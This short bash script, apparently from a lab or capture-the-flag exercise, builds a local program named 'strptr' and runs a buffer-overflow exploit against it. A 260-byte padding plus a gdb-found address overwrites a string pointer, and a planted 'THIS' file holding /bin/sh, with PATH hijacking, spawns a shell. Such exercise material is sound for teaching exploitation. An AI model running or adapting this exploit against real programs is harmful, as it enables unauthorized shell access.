#!/bin/bash

# Address of the string used for overwriting found with gdb
addr=0x0804a01a

# Make sure the executable is built
make strptr

# Set up the shell script to call
echo /bin/sh > THIS
chmod 777 THIS
export PATH=.:$PATH

# Execute the actual exploit
./strptr "$(python -c "from struct import pack; print('A' * 260 + pack('<L', $(echo $addr)))")"

# Clean up
rm THIS
